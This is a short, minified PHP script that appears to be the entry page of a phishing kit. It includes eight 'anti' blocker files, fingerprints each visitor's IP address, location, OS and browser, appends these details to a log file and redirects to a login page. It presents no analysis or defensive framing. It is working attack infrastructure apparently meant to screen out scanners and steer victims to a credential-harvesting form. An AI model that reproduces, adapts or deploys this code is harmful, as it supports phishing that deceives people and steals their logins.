<?php include '../prevents/anti1.php';include '../prevents/anti2.php';include '../prevents/anti3.php';include '../prevents/anti4.php';include '../prevents/anti5.php';include '../prevents/anti6.php';include '../prevents/anti7.php';include '../prevents/anti8.php';ob_start();session_start();require '../workshop/algo.php';if(isset($_GET['lang'])){$_SESSION['language']=$_GET['lang'];}else{$_SESSION['language']=getLanguage();}$_SESSION['ip']=clientData('ip');$_SESSION['ip_countryName']=clientData('country');$_SESSION['ip_countryCode']=clientData('code');$_SESSION['ip_city']=clientData('city');$_SESSION['ip_state']=clientData('state');$_SESSION['ip_timezone']=clientData('timezone');$_SESSION['currency']=clientData('currency');$_SESSION['os']=getOs();$_SESSION['browser']=getBrowser();date_default_timezone_set('GMT');$dateNow=date("d/m/Y H:i:s A");$code="{$_SESSION['ip']} | {$dateNow} | {$_SESSION['ip_countryName']} | {$_SESSION['os']} | {$_SESSION['browser']}\r\n";$save=fopen("../log.txt","a+");fwrite($save,$code);fclose($save);exit(header("Location: login.php"));?>